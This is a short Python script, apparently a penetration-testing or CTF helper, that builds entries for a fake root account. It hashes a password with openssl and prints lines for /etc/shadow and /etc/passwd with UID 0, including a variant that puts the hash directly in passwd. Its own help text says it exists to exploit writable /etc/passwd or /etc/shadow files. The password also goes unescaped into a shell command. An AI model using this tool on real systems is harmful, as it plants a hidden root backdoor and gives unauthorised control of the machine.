#!/usr/bin/python3
import sys
import os
import random
import argparse


def main(name,passwd):

    hashed = os.popen(f"/usr/bin/openssl passwd -6 -salt potato {passwd}").read().strip();
    shadow = f"{name}:{hashed}:{random.randint(1,3000)+19336}:0:99999:7:::";
    passwd = f"{name}:x:0:0:root:/root:/bin/bash";
    bad = f"{name}:{hashed}:0:0:root:/root:/bin/bash";
    return [shadow,passwd,bad];



if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Make a fake root account, to exploit writable /etc/passwd or /etc/shadow",epilog="End of Help :)");
    parser.add_argument("--user","-u",default="fakeroot",required=False);
    parser.add_argument("--password","-p",default="Pa55W0rd!",required=False);
    args = parser.parse_args();
        
    name = args.user;
    password = args.password

    pass_entry = main(name,password);
    print(f"user:pass\n{name}:{password}\n");
    print(f"For shadow file:\n{pass_entry[0]}");
    print(f"For passwd file:\n{pass_entry[1]}");
    print(f"Or... for hash in passwd file: (less secure)\n{pass_entry[2]}");
